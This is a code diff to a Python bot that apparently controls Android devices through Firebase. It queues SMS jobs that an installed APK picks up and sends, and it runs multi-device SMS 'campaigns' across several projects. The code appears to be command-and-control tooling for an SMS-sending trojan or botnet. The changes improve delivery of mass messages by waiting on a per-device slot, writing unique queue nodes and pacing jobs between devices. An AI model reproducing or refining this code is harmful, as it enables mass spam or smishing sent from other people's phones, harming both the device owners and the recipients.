@@ -36,8 +36,8 @@ ALLOWED_USERS: set[int] = set()  # empty = everyone
 SMS_PER_DEVICE = 5
 # Match 2.py: 15 min freshness window for lastSeen / heartbeat
 ONLINE_WINDOW_MS = 15 * 60 * 1000
-JOB_DELAY_SEC = 2.0
-PROGRESS_EDIT_EVERY = 3
+JOB_DELAY_SEC = 3.5   # give APK time to pick fixed-slot job before next overwrite
+PROGRESS_EDIT_EVERY = 2
 HTTP_TIMEOUT = 25
 
 # ── LOGGING ───────────────────────────────────────────────────────────────
@@ -388,93 +388,94 @@ def scan_devices(db_url: str, secret: str = "") -> list[dict]:
 
 def push_sms_job(db_url: str, secret: str, device_id: str, to: str, body: str, chat_id: int) -> str:
     """
-    Exact 2.py write order + payload fields.
-    Paths include .json leaf (fb_url will not double-append).
-    Also mirrors NEXUS queue as last fallback.
+    Write one SMS job for one recipient.
+
+    Critical for multi-recipient:
+    - Fixed path clients/.../webhookEvent/sendSms is a SINGLE slot.
+      Overwriting it before APK reads isSended causes only last number to send.
+    - Strategy:
+        1) Wait until previous slot is free (isSended true / null / timeout)
+        2) PUT new job on fixed 2.py paths
+        3) Also write unique NEXUS-style queue node (never overwrites)
     """
     job_id = str(uuid.uuid4())[:12]
     now_ms = int(time.time() * 1000)
-    # 2.py: sim_index default 0 (SIM 1). Also try 1 if needed by some APKs.
     to_n = to.strip()
     msg = body.strip()
 
-    payload_simple_0 = {
+    payload_simple = {
         "from": 0,
         "to": to_n,
         "message": msg,
         "isSended": False,
+        "ts": now_ms,
+        "jobId": job_id,
     }
-    payload_simple_1 = {
-        "from": 1,
-        "to": to_n,
-        "message": msg,
-        "isSended": False,
-    }
-    payload_cmd_0 = {
+    payload_cmd = {
         "cmdId": now_ms,
         "from": 0,
         "to": to_n,
         "message": msg,
         "isSended": False,
         "sendOk": False,
+        "jobId": job_id,
     }
-    payload_cmd_1 = {
-        "cmdId": now_ms,
-        "from": 1,
-        "to": to_n,
-        "message": msg,
-        "isSended": False,
-        "sendOk": False,
-    }
-    # NEXUS / AndroidSmsListener shape
     payload_nexus = {
         "to": to_n,
         "body": msg,
+        "message": msg,
         "status": "pending",
         "createdAt": now_ms,
         "requestedBy": chat_id,
         "sim": 1,
-    }
-    # Some APKs use "sms" / "text" key names
-    payload_alt = {
         "from": 0,
-        "to": to_n,
-        "sms": msg,
-        "text": msg,
-        "message": msg,
-        "body": msg,
         "isSended": False,
-        "status": "pending",
+        "jobId": job_id,
     }
 
-    # Same path strings as 2.py (with .json) first
-    attempts = [
-        (f"clients/{device_id}/webhookEvent/sendSms.json", payload_simple_0),
-        (f"devices/{device_id}/webhookEvent/sendSms.json", payload_simple_0),
-        (f"devices/{device_id}/actions/sendSms.json", payload_cmd_0),
-        (f"clients/{device_id}/actions/sendSms.json", payload_cmd_0),
-        # sim slot 1 variants
-        (f"clients/{device_id}/webhookEvent/sendSms.json", payload_simple_1),
-        (f"devices/{device_id}/webhookEvent/sendSms.json", payload_simple_1),
-        (f"devices/{device_id}/actions/sendSms.json", payload_cmd_1),
-        (f"clients/{device_id}/actions/sendSms.json", payload_cmd_1),
-        # without .json leaf (fb_url adds it)
-        (f"clients/{device_id}/webhookEvent/sendSms", payload_simple_0),
-        (f"devices/{device_id}/webhookEvent/sendSms", payload_simple_0),
-        (f"devices/{device_id}/actions/sendSms", payload_cmd_0),
-        (f"clients/{device_id}/actions/sendSms", payload_cmd_0),
-        # NEXUS queue
+    # Wait for previous fixed-slot job to finish (APK sets isSended=true)
+    fixed_paths = [
+        f"clients/{device_id}/webhookEvent/sendSms",
+        f"devices/{device_id}/webhookEvent/sendSms",
+    ]
+    wait_deadline = time.time() + 12.0  # max wait per number
+    while time.time() < wait_deadline:
+        busy = False
+        for p in fixed_paths:
+            try:
+                cur = fb_get(db_url, p, secret)
+            except Exception:
+                continue
+            if not isinstance(cur, dict):
+                continue
+            # slot occupied if isSended is explicitly False
+            if cur.get("isSended") is False and cur.get("to"):
+                # same number already there → ok to overwrite
+                if str(cur.get("to")).strip() == to_n:
+                    continue
+                busy = True
+                break
+        if not busy:
+            break
+        time.sleep(0.6)
+
+    # Primary fixed slots (2.py) — one write each after wait
+    primary = [
+        (f"clients/{device_id}/webhookEvent/sendSms.json", payload_simple),
+        (f"devices/{device_id}/webhookEvent/sendSms.json", payload_simple),
+        (f"devices/{device_id}/actions/sendSms.json", payload_cmd),
+        (f"clients/{device_id}/actions/sendSms.json", payload_cmd),
+    ]
+    # Unique queue nodes — never collide across recipients
+    unique = [
         (f"devices/{device_id}/sendSms/{job_id}", payload_nexus),
         (f"clients/{device_id}/sendSms/{job_id}", payload_nexus),
-        (f"devices/{device_id}/webhookEvent/sms", payload_alt),
-        (f"clients/{device_id}/webhookEvent/sms", payload_alt),
+        (f"devices/{device_id}/webhookEvent/sendSmsQueue/{job_id}", payload_simple),
+        (f"clients/{device_id}/webhookEvent/sendSmsQueue/{job_id}", payload_simple),
     ]
 
     last_err = None
     wrote_paths = []
-    # Write ALL primary 2.py paths so any APK listener present sees the job.
-    primary = attempts[:4]
-    extras = attempts[4:]
 
     for path, payload in primary:
         try:
@@ -485,26 +486,17 @@ def push_sms_job(db_url: str, secret: str, device_id: str, to: str, body: str, c
             last_err = e
             log.warning("path fail %s: %s", path, e)
 
-    if not wrote_paths:
-        for path, payload in extras:
-            try:
-                fb_put(db_url, path, payload, secret)
-                wrote_paths.append(path)
-                log.info("SMS job OK via fallback %s → %s", path, to_n)
-                break
-            except Exception as e:
-                last_err = e
-                log.warning("fallback fail %s: %s", path, e)
+    for path, payload in unique:
+        try:
+            fb_put(db_url, path, payload, secret)
+            wrote_paths.append(path)
+            log.info("SMS queue OK via %s → %s", path, to_n)
+        except Exception as e:
+            last_err = e
+            log.debug("unique path fail %s: %s", path, e)
 
     if not wrote_paths:
         raise RuntimeError(f"all send paths failed: {last_err}")
-
-    # Read-back verify first written path
-    try:
-        check = fb_get(db_url, wrote_paths[0].replace(".json", ""), secret)
-        log.info("verify %s → %s", wrote_paths[0], str(check)[:120] if check else "null")
-    except Exception as e:
-        log.warning("verify read failed: %s", e)
 
     return job_id
 
@@ -636,15 +628,19 @@ def run_campaign(chat_id: int):
     except Exception:
         s.progress_msg_id = None
 
+    # Prefer spreading recipients across different devices first (one each),
+    # so fixed-slot overwrite is less likely to drop numbers.
+    # queue already round-robins devices; keep per-device sequential with delay.
+
     for idx, (dev, number) in enumerate(queue):
         if s.cancel:
             break
         proj = s.projects[dev["project_idx"]]
         try:
-            push_sms_job(proj.db_url, proj.secret, dev["id"], number, s.message, chat_id)
+            jid = push_sms_job(proj.db_url, proj.secret, dev["id"], number, s.message, chat_id)
             with s.lock:
                 s.sent += 1
-            log.info("sent %s via %s/%s", number, proj.name, dev["id"])
+            log.info("sent %s via %s/%s job=%s", number, proj.name, dev["id"], jid)
         except Exception as e:
             with s.lock:
                 s.failed += 1
@@ -656,7 +652,12 @@ def run_campaign(chat_id: int):
             except Exception:
                 pass
 
+        # Extra pause when next job hits same device (fixed slot)
         time.sleep(JOB_DELAY_SEC)
+        if idx + 1 < len(queue):
+            next_dev = queue[idx + 1][0]
+            if (next_dev["project_idx"], next_dev["id"]) == (dev["project_idx"], dev["id"]):
+                time.sleep(2.0)  # same device again → wait longer for isSended
 
     s.step = "done"
     try:
